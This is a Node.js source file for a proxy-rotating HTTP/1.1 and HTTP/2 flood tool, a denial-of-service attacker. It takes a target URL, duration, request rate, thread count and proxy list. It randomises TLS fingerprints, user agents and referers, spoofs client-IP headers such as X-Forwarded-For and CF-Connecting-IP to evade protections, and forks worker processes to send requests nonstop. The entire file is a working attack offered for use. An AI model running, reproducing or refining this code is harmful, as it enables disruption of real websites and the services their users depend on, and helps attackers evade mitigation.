const net = require("net");
const tls = require("tls");
const http2 = require("http2");
const http = require("http");
const https = require("https");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const path = require("path");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
  console.log(`node ${path.basename(process.argv[1])} <target> <time> <rps> <threads> <proxyFile>`);
  process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
const rps = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (!target || !duration || !rps || !threads || !proxyFile) {
  console.log("Invalid arguments.");
  process.exit(1);
}

let proxies = [];
try {
  proxies = fs.readFileSync(proxyFile, "utf-8").toString().split(/\r?\n/).filter(Boolean);
} catch (e) {
  console.log("Proxy file not found or empty.");
  process.exit(1);
}
if (proxies.length === 0) {
  console.log("No proxies loaded.");
  process.exit(1);
}

const parsedTarget = url.parse(target.startsWith("http") ? target : "http://" + target);
const targetHost = parsedTarget.hostname;
const targetPort = parsedTarget.port || (parsedTarget.protocol === "https:" ? 443 : 80);
const targetPath = parsedTarget.path || "/";
const targetIsHttps = parsedTarget.protocol === "https:" || targetPort === 443;

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
];

const ciphers = [
  "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:HIGH:!aNULL:!MD5:!RC4",
     "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:RSA-PSS-RSAE-SHA512:RSA-PKCS1-SHA512:RSA-PSS-RSAE-SHA384:RSA-PKCS1-SHA384:RSA-PSS-RSAE-SHA256:RSA-PKCS1-SHA256",
     "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:DHE-DSS-AES128-GCM-SHA256:AES256-SHA:AES128-SHA:HIGH:!aNULL:!MD5:!RC4",
     "ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5",
     "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:HIGH:!aNULL:!MD5",
     "AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA:HIGH:!aNULL:!MD5:!RC4",
     "DHE-RSA-AES128-SHA256:DHE-DSS-AES128-SHA256:HIGH:!aNULL:!MD5",
     "ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:HIGH:!aNULL:!MD5",
     "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:AES256-SHA:HIGH:!aNULL:!MD5:!3DES",
     "DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA256:HIGH:!aNULL:!MD5",
     "ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:HIGH:!aNULL:!MD5",
     "AES128-SHA:AES256-SHA:AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4",
     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

const sigAlgs = [
   'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512'
];

const curves = ["prime256v1", "secp384r1", "secp521r1", "X25519"];

const acceptHeaders = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

const acceptLanguages = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.8",
  "en-CA,en;q=0.7",
  "en-AU,en;q=0.6",
  "en;q=0.9",
  "fr-FR,fr;q=0.9,en;q=0.8"
];

const acceptEncodings = [
  "gzip, deflate, br",
  "gzip, deflate",
  "br, gzip, deflate",
  "identity",
  "*"
];

const referers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/'
];

const methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"];

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomString(length) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function randomIP() {
  return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 255)}`;
}

function randomPort() {
  return randomInt(1, 65535);
}

function generateHeaders() {
  return {
    "Accept": randomElement(acceptHeaders),
    "Accept-Language": randomElement(acceptLanguages),
    "Accept-Encoding": randomElement(acceptEncodings),
    "Cache-Control": randomInt(0, 1) ? "no-cache" : "max-age=0",
    "Connection": randomInt(0, 1) ? "keep-alive" : "close",
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": randomElement(userAgents),
    "Referer": randomElement(referers) + randomString(5),
    "X-Forwarded-For": randomIP(),
    "X-Real-IP": randomIP(),
    "X-Client-IP": randomIP(),
    "X-Originating-IP": randomIP(),
    "X-Remote-Addr": randomIP(),
    "X-Cluster-Client-IP": randomIP(),
    "True-Client-IP": randomIP(),
    "CF-Connecting-IP": randomIP(),
    "CF-IPCountry": randomString(2).toUpperCase(),
    "X-Country-Code": randomString(2).toUpperCase(),
    "X-Forwarded-Host": randomString(8) + ".com",
    "X-Forwarded-Proto": randomInt(0, 1) ? "http" : "https",
    "X-Host": targetHost,
    "X-Forwarded-Server": randomString(8) + ".com"
  };
}

function generatePath() {
  const basePath = targetPath || "/";
  const query = `?${randomString(8)}=${randomString(8)}&${randomString(5)}=${randomString(5)}`;
  return basePath + query;
}

function parseProxy(proxyStr) {
  const parts = proxyStr.split(":");
  if (parts.length === 2) {
    return { host: parts[0], port: parseInt(parts[1]), username: null, password: null };
  } else if (parts.length === 4) {
    return { host: parts[0], port: parseInt(parts[1]), username: parts[2], password: parts[3] };
  }
  return null;
}

function connectThroughProxy(proxy, targetHost, targetPort, callback) {
  const proxyInfo = parseProxy(proxy);
  if (!proxyInfo) {
    callback(new Error("Invalid proxy format"));
    return;
  }

  const socket = net.connect(proxyInfo.port, proxyInfo.host, () => {
    let connectRequest = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n`;
    if (proxyInfo.username) {
      const auth = Buffer.from(`${proxyInfo.username}:${proxyInfo.password}`).toString("base64");
      connectRequest += `Proxy-Authorization: Basic ${auth}\r\n`;
    }
    connectRequest += "\r\n";
    socket.write(connectRequest);
  });

  let buffer = "";
  let connected = false;

  socket.on("data", (data) => {
    buffer += data.toString();
    if (!connected && buffer.includes("\r\n\r\n")) {
      const headerEnd = buffer.indexOf("\r\n\r\n");
      const responseHeader = buffer.slice(0, headerEnd);
      if (responseHeader.includes("200")) {
        connected = true;
        buffer = buffer.slice(headerEnd + 4);
        callback(null, socket, buffer);
      } else {
        socket.destroy();
        callback(new Error("Proxy connection failed"));
      }
    } else if (connected) {
      callback(null, socket, buffer);
      buffer = "";
    }
  });

  socket.on("error", (err) => {
    if (!connected) {
      callback(err);
    }
  });

  socket.on("close", () => {
    if (!connected) {
      callback(new Error("Proxy closed"));
    }
  });
}

function floodHttp2(proxy, callback) {
  connectThroughProxy(proxy, targetHost, targetPort, (err, socket, initialData) => {
    if (err) {
      callback(err);
      return;
    }

    const tlsOptions = {
      socket: socket,
      host: targetHost,
      servername: targetHost,
      rejectUnauthorized: false,
      ALPNProtocols: ["h2"],
      ciphers: randomElement(ciphers),
      sigalgs: randomElement(sigAlgs),
      ecdhCurve: randomElement(curves),
      secureProtocol: "TLS_method",
      session: false,
      minVersion: "TLSv1.2",
      maxVersion: "TLSv1.3"
    };

    const tlsSocket = tls.connect(tlsOptions, () => {
      const session = http2.connect(`https://${targetHost}:${targetPort}`, {
        createConnection: () => tlsSocket,
        settings: {
          headerTableSize: 65536,
          maxConcurrentStreams: 10000,
          initialWindowSize: 6291456,
          maxHeaderListSize: 65536,
          enablePush: false
        }
      });

      session.on("error", () => {
        session.destroy();
      });

      session.on("close", () => {
        tlsSocket.destroy();
        socket.destroy();
      });

      let activeStreams = 0;
      const maxStreams = 1000;
      const requestInterval = setInterval(() => {
        if (activeStreams >= maxStreams) return;
        const headers = generateHeaders();
        headers[":method"] = randomElement(methods);
        headers[":path"] = generatePath();
        headers[":scheme"] = "https";
        headers[":authority"] = `${targetHost}:${targetPort}`;
        headers["origin"] = `https://${targetHost}`;

        const req = session.request(headers);
        activeStreams++;

        req.on("response", (hdrs) => {
          req.close();
          req.destroy();
          activeStreams--;
        });

        req.on("error", () => {
          req.destroy();
          activeStreams--;
        });

        req.end();
      }, randomInt(1, 10));

      tlsSocket.on("close", () => {
        clearInterval(requestInterval);
        session.destroy();
      });

      socket.on("close", () => {
        clearInterval(requestInterval);
        session.destroy();
      });
    });

    tlsSocket.on("error", (e) => {
      socket.destroy();
      callback(e);
    });

    tlsSocket.on("close", () => {
      callback(new Error("TLS closed"));
    });
  });
}

function floodHttp1(proxy, callback) {
  connectThroughProxy(proxy, targetHost, targetPort, (err, socket, initialData) => {
    if (err) {
      callback(err);
      return;
    }

    const options = {
      host: targetHost,
      port: targetPort,
      method: randomElement(methods),
      path: generatePath(),
      headers: generateHeaders(),
      agent: false,
      createConnection: () => socket
    };

    const req = (targetIsHttps ? https : http).request(options, (res) => {
      res.resume();
      res.on("end", () => {
        callback(null);
      });
    });

    req.on("error", (e) => {
      callback(e);
    });

    req.end();
  });
}

function runWorker() {
  const startTime = Date.now();
  const proxyPool = proxies.slice();
  let requestCount = 0;

  function attack() {
    if (Date.now() - startTime >= duration) {
      process.exit(0);
    }

    const proxy = randomElement(proxyPool);
    const useHttp2 = Math.random() < 0.8;

    if (useHttp2) {
      floodHttp2(proxy, (err) => {
        if (!err) requestCount++;
        setImmediate(attack);
      });
    } else {
      floodHttp1(proxy, (err) => {
        if (!err) requestCount++;
        setImmediate(attack);
      });
    }
  }

  for (let i = 0; i < rps; i++) {
    attack();
  }
}

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  cluster.on("exit", (worker, code, signal) => {
    if (Date.now() < (parseInt(process.argv[3]) * 1000)) {
      cluster.fork();
    }
  });
  setTimeout(() => {
    process.exit(0);
  }, duration + 5000);
} else {
  runWorker();
}
